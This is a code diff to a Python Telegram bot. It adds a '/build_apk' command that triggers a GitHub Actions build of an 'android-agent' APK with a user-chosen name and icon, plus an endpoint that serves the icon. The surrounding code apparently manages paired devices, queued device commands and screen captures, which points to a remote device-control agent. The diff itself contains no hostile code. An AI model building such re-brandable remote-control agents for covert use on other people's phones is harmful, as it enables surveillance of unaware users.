@@ -13,9 +13,11 @@ from http import HTTPStatus
 from http.server import SimpleHTTPRequestHandler, ThreadingHTTPServer
 from pathlib import Path
 from urllib.parse import parse_qs, quote, urlparse
+import urllib.error
+import urllib.request
 
 from aiogram import Bot, Dispatcher, F
-from aiogram.filters import Command, CommandStart
+from aiogram.filters import Command, CommandObject, CommandStart
 from aiogram.types import (
     Message,
     CallbackQuery,
@@ -58,11 +60,16 @@ STORAGE_DIR.mkdir(exist_ok=True)
 MINI_APP_DIR = BASE_DIR / "mini_app"
 AGENT_APK_NAME = "apk-agent.apk"
 AGENT_APK_URL = os.getenv("AGENT_APK_URL", "").strip()
+GITHUB_REPO = os.getenv("GITHUB_REPO", "playtowin328-lab/HunterAPIK").strip()
+GITHUB_TOKEN = os.getenv("GITHUB_TOKEN", "").strip()
+GITHUB_WORKFLOW = os.getenv("GITHUB_WORKFLOW", "android-agent-apk.yml").strip()
 DEVICE_DB_PATH = STORAGE_DIR / "devices.json"
 PAIRING_DB_PATH = STORAGE_DIR / "pairing_codes.json"
 COMMAND_DB_PATH = STORAGE_DIR / "device_commands.json"
 SCREEN_DIR = STORAGE_DIR / "screens"
 SCREEN_DIR.mkdir(exist_ok=True)
+BUILD_ASSET_DIR = STORAGE_DIR / "build_assets"
+BUILD_ASSET_DIR.mkdir(exist_ok=True)
 DB_PATH = Path(os.getenv("DB_PATH", str(STORAGE_DIR / "app.db")))
 MAX_IMAGE_SIZE_MB = int(os.getenv("MAX_IMAGE_SIZE_MB", "20"))
 MAX_IMAGE_SIZE_BYTES = MAX_IMAGE_SIZE_MB * 1024 * 1024
@@ -236,10 +243,56 @@ async def send_status(message: Message) -> None:
         f"Public URL: {PUBLIC_BASE_URL or 'missing'}",
         f"Mini App URL: {MINI_APP_URL or 'missing'}",
         f"Agent APK: {apk_source}",
+        f"GitHub build: {'ready' if GITHUB_TOKEN and GITHUB_REPO else 'missing token/repo'}",
         f"Storage: {STORAGE_DIR}",
         f"DB: {DB_PATH}",
     ]
     await message.answer("\n".join(lines))
+
+
+async def send_build_apk(message: Message, command: CommandObject) -> None:
+    if not await ensure_message_admin(message):
+        return
+
+    app_name = (command.args or "").strip()
+    if not app_name:
+        await message.answer(
+            "Send an app name like this:\n\n"
+            "/build_apk My Agent\n\n"
+            "Optional: send an icon image to the bot first, then run the command."
+        )
+        return
+
+    if not GITHUB_TOKEN:
+        await message.answer(
+            "I cannot start APK build yet. Add GITHUB_TOKEN to Railway variables, then redeploy.\n\n"
+            "Token needs repo/actions permission for this repository."
+        )
+        return
+
+    icon_url = None
+    image_path = user_last_photo.get(message.from_user.id)
+    if image_path and image_path.exists() and PUBLIC_BASE_URL:
+        try:
+            icon_url = await asyncio.to_thread(prepare_build_icon, message.from_user.id, image_path)
+        except Exception as exc:
+            await message.answer(f"Icon image could not be prepared, building with default icon. Error: {exc}")
+
+    try:
+        await asyncio.to_thread(trigger_github_apk_build, app_name, icon_url)
+    except Exception as exc:
+        await message.answer(f"GitHub APK build did not start: {exc}")
+        return
+
+    release_url = f"https://github.com/{GITHUB_REPO}/releases/tag/android-agent-latest"
+    await message.answer(
+        "APK build started.\n\n"
+        f"App name: {app_name[:40]}\n"
+        f"Icon: {'custom' if icon_url else 'default'}\n\n"
+        "Wait for GitHub Actions to finish, then open:\n"
+        f"{release_url}\n\n"
+        "After the release is green, /agent will download the APK."
+    )
 
 
 async def send_pairing_code(message: Message) -> None:
@@ -557,6 +610,63 @@ def agent_apk_path() -> Path | None:
     return None
 
 
+def build_asset_url(owner_id: int, filename: str) -> str:
+    return f"{public_server_url()}/build-assets/{owner_id}/{quote(filename)}"
+
+
+def prepare_build_icon(owner_id: int, source_path: Path) -> str | None:
+    if not source_path.exists():
+        return None
+
+    user_assets = BUILD_ASSET_DIR / str(owner_id)
+    user_assets.mkdir(parents=True, exist_ok=True)
+    output_path = user_assets / "icon.png"
+    with Image.open(source_path) as source:
+        image = source.convert("RGBA")
+        image.thumbnail((512, 512), Image.LANCZOS)
+        canvas = Image.new("RGBA", (512, 512), (0, 0, 0, 0))
+        x = (512 - image.width) // 2
+        y = (512 - image.height) // 2
+        canvas.alpha_composite(image, (x, y))
+        canvas.save(output_path, "PNG")
+    return build_asset_url(owner_id, "icon.png")
+
+
+def trigger_github_apk_build(app_name: str, icon_url: str | None) -> None:
+    if not GITHUB_TOKEN:
+        raise RuntimeError("GITHUB_TOKEN is missing")
+    if not GITHUB_REPO:
+        raise RuntimeError("GITHUB_REPO is missing")
+
+    endpoint = f"https://api.github.com/repos/{GITHUB_REPO}/actions/workflows/{GITHUB_WORKFLOW}/dispatches"
+    payload = {
+        "ref": "main",
+        "inputs": {
+            "app_name": app_name[:40],
+            "icon_url": icon_url or "",
+        },
+    }
+    request = urllib.request.Request(
+        endpoint,
+        data=json.dumps(payload).encode("utf-8"),
+        headers={
+            "Accept": "application/vnd.github+json",
+            "Authorization": f"Bearer {GITHUB_TOKEN}",
+            "Content-Type": "application/json",
+            "User-Agent": "apk-converter-bot",
+            "X-GitHub-Api-Version": "2022-11-28",
+        },
+        method="POST",
+    )
+    try:
+        with urllib.request.urlopen(request, timeout=20) as response:
+            if response.status not in (200, 201, 202, 204):
+                raise RuntimeError(f"GitHub returned HTTP {response.status}")
+    except urllib.error.HTTPError as exc:
+        details = exc.read().decode("utf-8", errors="replace")
+        raise RuntimeError(f"GitHub returned HTTP {exc.code}: {details[:500]}") from exc
+
+
 def pair_links(code: str) -> dict[str, str]:
     server = public_server_url()
     encoded_server = quote(server, safe="")
@@ -764,6 +874,10 @@ class MiniAppRequestHandler(SimpleHTTPRequestHandler):
             self.handle_agent_apk()
             return
 
+        if parsed_url.path.startswith("/build-assets/"):
+            self.handle_build_asset(parsed_url)
+            return
+
         if parsed_url.path == "/api/devices/commands/next":
             query = parse_qs(parsed_url.query)
             payload = {
@@ -922,6 +1036,32 @@ class MiniAppRequestHandler(SimpleHTTPRequestHandler):
         self.send_response(HTTPStatus.OK)
         self.send_header("Content-Type", "application/vnd.android.package-archive")
         self.send_header("Content-Disposition", f'attachment; filename="{AGENT_APK_NAME}"')
+        self.send_header("Content-Length", str(len(body)))
+        self.end_headers()
+        self.wfile.write(body)
+
+    def handle_build_asset(self, parsed_url) -> None:
+        relative = parsed_url.path.removeprefix("/build-assets/").strip("/")
+        parts = [part for part in relative.split("/") if part]
+        if len(parts) != 2:
+            self.send_json({"error": "asset not found"}, HTTPStatus.NOT_FOUND)
+            return
+
+        owner_id, filename = parts
+        if not owner_id.isdigit() or filename not in {"icon.png", "icon.jpg", "icon.jpeg"}:
+            self.send_json({"error": "asset not found"}, HTTPStatus.NOT_FOUND)
+            return
+
+        path = BUILD_ASSET_DIR / owner_id / filename
+        if not path.exists() or not path.is_file():
+            self.send_json({"error": "asset not found"}, HTTPStatus.NOT_FOUND)
+            return
+
+        content_type = "image/png" if filename.endswith(".png") else "image/jpeg"
+        body = path.read_bytes()
+        self.send_response(HTTPStatus.OK)
+        self.send_header("Content-Type", content_type)
+        self.send_header("Cache-Control", "public, max-age=3600")
         self.send_header("Content-Length", str(len(body)))
         self.end_headers()
         self.wfile.write(body)
@@ -1351,6 +1491,7 @@ async def run_bot() -> None:
     dp.message.register(send_settings, Command("settings"))
     dp.message.register(send_my_id, Command("myid"))
     dp.message.register(send_status, Command("status"))
+    dp.message.register(send_build_apk, Command("build_apk"))
     dp.message.register(send_pairing_code, Command("pair"))
     dp.message.register(handle_web_app_data, F.web_app_data)
     dp.message.register(handle_photo, F.photo)
